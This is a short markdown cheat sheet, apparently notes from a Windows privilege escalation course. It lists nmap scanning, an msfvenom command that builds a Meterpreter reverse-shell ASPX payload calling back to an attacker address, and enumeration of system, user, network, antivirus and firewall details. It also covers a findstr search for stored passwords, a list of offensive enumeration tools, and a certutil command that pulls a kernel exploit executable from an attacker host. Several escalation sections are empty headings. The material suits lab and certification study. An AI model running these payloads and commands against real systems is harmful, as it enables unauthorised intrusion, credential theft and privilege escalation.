# Windows Privilege Escalation Course

**Gaining a Foothold**

```text
nmap -A -T4 -p- IP  

aspx simple Metasploit shell  

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.10.10 LPORT 4444 -f aspx > exploit.aspx
```

**Enumeration**

System Enumeration

```text
getuid  

sysinfo  

systeminfo
```

_Check For patches_

```text
wmic qfe

wmic qfe get Caption,Description, HotFixID, InstalledOn  

wmic logicaldisk get caption,description,providername
```

User Enumeration

```text
whoami  
whoami /priv  
whoami /groups  
net user  
net user raviraj  
net localgroup
```

Network Enumeration

```text
ipconfig /all  
arp -a  
route print  
netstat -ano
```

**Password hunting**

```text
findstr /si password \*.txt \*.ini \*.config
```

**- A/V and Firewall Enumeration**

\(service control\)

```text
sc query windefend  
sc queryex type= service  

netsh advfirewall firewall dump  
netsh firewall show state  
netsh firewall show config
```

**Exploring Automated Tools**

\( Executables \)

winPeas.exe  
Seatbelt.exe\(compile\)  
Watson.exe\(compile\)  
SharpUp.exe\(compile\)

\( PowerShell \)

Sherlock.ps1  
PowerUp.ps1  
jaws-enum.ps1

\( Other \)

windows-exploit-suggester.py \(local\)  
Explit Suggester \(Metasploit\)

**pip Install command**

```text
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
```

**Escalation Path : Kernel exploit**  
~~~~~~~~~~~~~

File Transfer utility in windows

```text
certutil -urlcache -f http://10.10.10.10/MS10-059.exe ms.exe
```

**Escalation Path : Password**  
~~~~~~~~~~~~~

**Escalation Path :** Windows subsystem for Linux  
~~~~~~~~~~~~~

